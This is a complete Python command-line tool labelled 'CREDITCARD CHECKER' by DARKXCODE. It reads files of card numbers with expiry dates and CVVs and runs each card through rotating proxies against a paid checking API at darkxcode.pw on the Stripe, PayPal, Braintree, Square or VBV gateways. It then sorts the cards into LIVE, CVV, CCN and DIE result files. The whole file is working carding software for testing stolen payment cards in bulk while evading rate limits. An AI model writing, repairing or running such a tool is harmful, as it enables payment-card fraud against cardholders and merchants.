#!/usr/bin/env python3

from __future__ import annotations

import configparser
import json
import os
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

API_DEFAULT = "https://darkxcode.pw"
GATEWAYS = ("vbv", "stripe", "paypal", "braintree", "square")
KEY_PATTERN = re.compile(r"^dxx_[a-f0-9]{40}$", re.I)
VERSION = "6.0"
SCRIPT_DIR = Path(__file__).resolve().parent
SETTINGS_FILE = SCRIPT_DIR / "settings.ini"
RESULT_DIR = SCRIPT_DIR / "result"

# Windows consoles default to cp1252; country names carry emoji.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

if os.name == "nt":
    os.system("")  # enables ANSI escapes in cmd.exe


class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"


BANNER = f"""{C.GREEN}
                                 /           /
                                /' .,,,,  ./ \\
                               /';'     ,/  \\
                              / /   ,,//,'''
                             ( ,, '_,  ,,,' ''
                             |    /{C.RED}@{C.GREEN}  ,,, ;' '
                            /    .   ,''/' ','''
                           /   .     ./, ',, ' ;
                        ,./  .   -,',', ,/'','\\,'
                       |   /; ./,,'',,'' |   |
                       |     /   ','    /    |
                        \\___/'   '     |     |
                         ',,'  |      /     '\\
                              /  (   |   )    ~\\
                             '   \\   (    \\     \\~
                             :    \\                \\
                              ; .         \\--
                               :   \\         ; {C.MAGENTA}
,------.    ,---.  ,------. ,--. ,--.,--.   ,--. ,-----.  ,-----. ,------.  ,------.
|  .-.  \\  /  O  \\ |  .--. '|  .'   / \\  `.'  / '  .--./ '  .-.  '|  .-.  \\ |  .---'
|  |  \\  :|  .-.  ||  '--'.'|  .   '   .'    \\  |  |     |  | |  ||  |  \\  :|  `--,
|  '--'  /|  | |  ||  |\\  \\ |  |\\   \\ /  .'.  \\ '  '--'\\ '  '-'  '|  '--'  /|  `---.
`-------' `--' `--'`--' '--'`--' '--''--'   '--' `-----'  `-----' `-------' `------'
{C.RED}       ==================================================================={C.RESET}
                    |{C.BLUE} SCRIPT{C.RESET}   :{C.GREEN} CREDITCARD CHECKER{C.RESET}           |
                    |{C.BLUE} VERSION{C.RESET}  :{C.GREEN} {VERSION}{C.RESET}                          |
                    |{C.BLUE} API FROM {C.RESET}:{C.GREEN} {API_DEFAULT}{C.RESET}         |
{C.RED}       ==================================================================={C.RESET}
"""

DISPLAY = {
    "APPROVED": "LIVE",
    "CVV": "CVV",
    "CCN": "CCN",
    "DIE": "DIE",
    "RETRY": "RETRY",
    "ERROR": "ERROR",
}

COLORS = {
    "LIVE": C.GREEN,
    "CVV": C.CYAN,
    "CCN": C.YELLOW,
    "DIE": C.RED,
    "RETRY": C.BLUE,
    "ERROR": C.MAGENTA,
}

VARIANTS = ("LIVE", "CVV", "CCN", "DIE", "RETRY", "ERROR")


def ask(label: str) -> str:
    return input(f"{C.YELLOW}[+]{C.RESET}{C.BLUE} {label}{C.GREEN} >> {C.BLUE}").strip()


def normalize_card(raw: str) -> tuple[str | None, str]:
    """Return (card, '') when the line is checkable, else (None, reason)."""
    parts = [part.strip() for part in re.split(r"[|:/;]", raw.strip())]

    if len(parts) != 4:
        return None, "invalid format"

    number, month, year, cvv = (re.sub(r"\D", "", part) for part in parts)

    if re.fullmatch(r"\d{13,19}", number) is None:
        return None, "card number must be 13-19 digits"

    if not month.isdigit() or not 1 <= int(month) <= 12:
        return None, "invalid month"

    if len(year) == 2:
        year = "20" + year
    elif len(year) != 4:
        return None, "invalid year"

    now = datetime.now()

    if (int(year), int(month)) < (now.year, now.month):
        return None, "expired"

    amex = number.startswith(("34", "37"))
    valid_cvv = r"\d{4}" if amex else r"\d{3,4}"

    if re.fullmatch(valid_cvv, cvv) is None:
        return None, "invalid cvv"

    return f"{number}|{int(month):02d}|{year}|{cvv}", ""


def normalize_proxy(raw: str) -> str | None:
    line = raw.strip()

    if line == "":
        return None

    candidate = line if "://" in line else "http://" + line

    try:
        parts = urllib.parse.urlsplit(candidate)
        port = parts.port
    except ValueError:
        return None

    if parts.hostname is None or port is None or not 1 <= port <= 65535:
        return None

    return candidate


def post_json(url: str, key: str, payload: dict, timeout: int) -> tuple[int, dict]:
    request = urllib.request.Request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        method="POST",
        headers={
            "X-API-Key": key,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "darkxcode-cc-cli/1.0",
        },
    )

    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, json.loads(response.read().decode("utf-8"))
    except urllib.error.HTTPError as error:
        raw = error.read().decode("utf-8", errors="replace")

        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = {"status": "error", "message": raw[:200]}

        return error.code, parsed if isinstance(parsed, dict) else {}


class RateGate:
    """Serialises request starts so the key stays under its per-second cap."""

    def __init__(self, per_second: int) -> None:
        self.lock = threading.Lock()
        self.interval = 1.0 / per_second
        self.next_at = time.monotonic()

    def wait(self) -> None:
        with self.lock:
            now = time.monotonic()

            if now < self.next_at:
                time.sleep(self.next_at - now)
                now = time.monotonic()

            self.next_at = now + self.interval


class CreditCardChecker:
    def __init__(self, api: str, key: str) -> None:
        self.api = api.rstrip("/")
        self.key = key
        self.gateway = ""
        self.cards: list[str] = []
        self.proxies: list[str] = []
        self.threads = 3
        self.retries = 3
        self.timeout = 60
        self.out = RESULT_DIR

        self.gate = RateGate(40)
        self.lock = threading.Lock()
        self.proxy_index = 0
        self.counts = {name: 0 for name in VARIANTS}
        self.credit = 0
        self.remaining = 0
        self.done = 0
        self.fatal = ""
        self.out.mkdir(parents=True, exist_ok=True)

    # ------------------------------------------------------------------ API

    def account(self) -> None:
        code, data = post_json(f"{self.api}/api/account/status", self.key, {}, self.timeout)

        if code == 401:
            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} {data.get('message', 'Invalid API key.')}{C.RESET}")
            raise SystemExit(1)

        if code != 200:
            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Account status failed (HTTP {code}): "
                  f"{data.get('message', '')}{C.RESET}")
            raise SystemExit(1)

        user = (data.get("user") or {}).get("username", "-")
        subscription = data.get("subscription") or {}
        self.remaining = int(data.get("credits", 0))

        plan = "subscriber" if subscription.get("active") else "credits"
        print(f"{C.YELLOW}[+]{C.RESET}{C.BLUE} Account: {C.GREEN}{user}{C.BLUE} | "
              f"credits: {C.GREEN}{self.remaining}{C.BLUE} ({plan}){C.RESET}")

        if self.remaining < 1 and not subscription.get("active"):
            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} No credits left on this API key{C.RESET}")
            raise SystemExit(1)

    def next_proxy(self) -> str:
        with self.lock:
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)

        return proxy

    def save(self, status: str, card: str, message: str) -> None:
        line = f"{status} | {card} | {json.dumps(message)}\n"

        with self.lock:
            with (self.out / f"{status}.txt").open("a", encoding="utf-8") as handle:
                handle.write(line)

    def check_one(self, card: str) -> tuple[str, str]:
        last: tuple[str, str] = ("RETRY", "no proxy could answer")

        for attempt in range(1, self.retries + 1):
            if self.fatal:
                return "ERROR", "aborted: " + self.fatal

            proxy = self.next_proxy()
            self.gate.wait()

            try:
                code, data = post_json(
                    f"{self.api}/api/tools/cc-checker",
                    self.key,
                    {"input": card, "gateway": self.gateway, "proxies": [proxy]},
                    self.timeout,
                )
            except (urllib.error.URLError, TimeoutError, OSError) as error:
                last = ("RETRY", f"request failed: {error}")
                continue

            message = str(data.get("message") or data.get("response") or "")

            if code == 429:
                last = ("RETRY", "rate limited by API")
                time.sleep(min(5, attempt))
                continue

            if code in (401, 402, 403, 422):
                self.fatal = message or f"HTTP {code}"
                return "ERROR", "aborted: " + self.fatal

            if code != 200:
                last = ("RETRY", message or f"HTTP {code}")
                continue

            status = str(data.get("status") or "DIE").upper()
            status = DISPLAY.get(status, "DIE")
            credit = int(data.get("credit_used") or 0)

            with self.lock:
                self.credit += credit

                if data.get("remaining_credit") is not None:
                    self.remaining = int(data["remaining_credit"])

            if status == "RETRY":
                last = ("RETRY", message or "no proxy could answer")
                continue

            return status, message

        return last

    # ------------------------------------------------------------------ flow

    def load_cards(self) -> None:
        path = Path(ask("Enter CC file path")).expanduser()

        if not path.is_file():
            print(f" {C.YELLOW}[!]{C.RESET}{C.BLUE} Error: File {path} not found{C.RESET}")
            raise SystemExit(1)

        seen: set[str] = set()

        with path.open("r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                line = line.strip()

                if line == "":
                    continue

                card, error = normalize_card(line)

                if card is None:
                    print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Invalid card ({error}): {line[:40]}{C.RESET}")
                    continue

                if card in seen:
                    continue

                seen.add(card)
                self.cards.append(card)

        if not self.cards:
            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} No valid CC records found{C.RESET}")
            raise SystemExit(1)

        print(f"{C.YELLOW}[+]{C.RESET}{C.BLUE} Loaded {C.GREEN}{len(self.cards)}{C.BLUE} card(s){C.RESET}")

    def load_proxies(self) -> None:
        path = Path(ask("Enter proxy file path")).expanduser()

        if not path.is_file():
            print(f" {C.YELLOW}[!]{C.RESET}{C.BLUE} Error: File {path} not found{C.RESET}")
            raise SystemExit(1)

        with path.open("r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                proxy = normalize_proxy(line)

                if proxy is not None and proxy not in self.proxies:
                    self.proxies.append(proxy)

        if not self.proxies:
            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} No valid proxies found{C.RESET}")
            raise SystemExit(1)

        print(f"{C.YELLOW}[+]{C.RESET}{C.BLUE} Loaded {C.GREEN}{len(self.proxies)}{C.BLUE} proxy(ies){C.RESET}")

    def choose_gateway(self) -> None:
        print(f"\n   {C.RED}==============>{C.GREEN} GATEWAY {C.RED}<================{C.RESET}")
        print(f"  {C.RESET}[{C.GREEN}1{C.RESET}]{C.BLUE} VBV CHECK     {C.RESET}[{C.GREEN}2{C.RESET}]{C.BLUE} STRIPE{C.RESET}")
        print(f"  {C.RESET}[{C.GREEN}3{C.RESET}]{C.BLUE} PAYPAL        {C.RESET}[{C.GREEN}4{C.RESET}]{C.BLUE} BRAINTREE{C.RESET}")
        print(f"  {C.RESET}[{C.GREEN}5{C.RESET}]{C.BLUE} SQUARE        {C.RESET}[{C.GREEN}99{C.RESET}]{C.RED} EXIT{C.RESET}")

        menu = {"1": "vbv", "2": "stripe", "3": "paypal", "4": "braintree", "5": "square"}

        while True:
            choice = ask("Select gateway")

            if choice == "99":
                print(f"\n\n{C.YELLOW}[!]{C.RESET}{C.BLUE}. . . Exiting . . .{C.RESET}\n\n")
                raise SystemExit(0)

            if choice in menu:
                self.gateway = menu[choice]
                return

            print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Invalid choice. Please try again{C.RESET}")

    def choose_threads(self) -> None:
        while True:
            raw = ask("Enter number of Threads (3-10)")

            if not raw.isdigit() or not 3 <= int(raw) <= 10:
                print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Threads must be between 3 and 10{C.RESET}")
                continue

            self.threads = int(raw)
            return

    def run(self) -> None:
        self.load_cards()
        self.load_proxies()
        self.choose_gateway()
        self.choose_threads()
        print(f"{C.YELLOW}={C.RESET}" * 75)

        total = len(self.cards)
        started = time.monotonic()
        executor = ThreadPoolExecutor(max_workers=self.threads)

        try:
            futures = {executor.submit(self.check_one, card): card for card in self.cards}

            for future in as_completed(futures):
                card = futures[future]

                try:
                    status, message = future.result()
                except Exception as error:  # a worker bug must not kill the run
                    status, message = "ERROR", f"worker error: {error}"

                with self.lock:
                    self.done += 1
                    self.counts[status] += 1
                    done = self.done
                    remaining = self.remaining

                self.save(status, card, message)

                progress = f"{C.RED}{done}{C.RESET}/{C.GREEN}{total}{C.RESET}"
                paint = COLORS.get(status, C.RESET)
                print(f"[{progress}] {C.BLUE}{card}{C.RESET} {C.YELLOW}-> {paint}{status}{C.RESET} {C.YELLOW}|{C.RESET}"
                      f"{C.YELLOW} {message[:70]}{C.RESET} {C.YELLOW}|{C.RESET} {C.WHITE}CREDIT: {remaining}{C.RESET} {C.YELLOW}|{C.RESET} "
                      f"{C.CYAN}BY DARKXCODE V{VERSION}{C.RESET}")

                if self.fatal:
                    print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Stopped: {self.fatal}{C.RESET}")
                    break
        finally:
            executor.shutdown(wait=True, cancel_futures=True)

        elapsed = time.monotonic() - started
        print(f"{C.YELLOW}={C.RESET}" * 75)
        print("Checking completed!")

        for name in VARIANTS:
            print(f"{name}: {self.counts[name]}")

        print(f"Credits used: {self.credit}")
        print(f"Remaining credit: {self.remaining}")
        print(f"Time taken: {elapsed:.2f} seconds")


def load_config() -> tuple[str, str]:
    if not SETTINGS_FILE.exists():
        SETTINGS_FILE.write_text(
            f"[API]\nendpoint = {API_DEFAULT}\n# apikey = dxx_...\n",
            encoding="utf-8",
        )

    config = configparser.ConfigParser()
    config.read(SETTINGS_FILE, encoding="utf-8")
    api = config.get("API", "endpoint", fallback=API_DEFAULT)
    key = os.environ.get("DXX_API_KEY", "").strip() or config.get("API", "apikey", fallback="").strip()

    if key == "":
        key = ask("Enter your API key")

    if KEY_PATTERN.match(key) is None:
        print(f"{C.YELLOW}[!]{C.RESET}{C.BLUE} Invalid API key format (dxx_ + 40 hex){C.RESET}")
        raise SystemExit(1)

    return api, key


def main() -> int:
    print(BANNER)

    try:
        api, key = load_config()
        checker = CreditCardChecker(api, key)
        checker.account()
        checker.run()
    except (KeyboardInterrupt, EOFError):
        print(f"\n{C.YELLOW}[!]{C.RESET}{C.BLUE}. . . Exiting . . .{C.RESET}\n")
        return 130

    return 0


if __name__ == "__main__":
    sys.exit(main())